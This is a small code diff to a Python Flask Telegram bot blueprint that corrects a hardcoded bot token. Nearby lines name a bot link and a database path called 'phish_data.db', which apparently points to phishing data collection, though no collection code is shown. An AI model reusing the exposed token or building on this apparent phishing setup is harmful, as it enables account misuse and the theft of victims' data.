@@ -12,7 +12,7 @@ logger = logging.getLogger(__name__)
 bp = Blueprint('md_bot', __name__, url_prefix='/bot')
 
 # ========== আপনার টোকেন (সঠিক) ==========
-BOT_TOKEN = "8193376363:AAHTTtXNtQqCZ2a_Hd1cpus1Z2iz6kOORo"
+BOT_TOKEN = "8193376363:AAHTTtXNtQqCZ2a_Hd1Lcpus1Z2iz6kOORo"
 BOT_LINK = "https://t.me/Arif1222_bot"
 DB_PATH = '/tmp/phish_data.db'
 
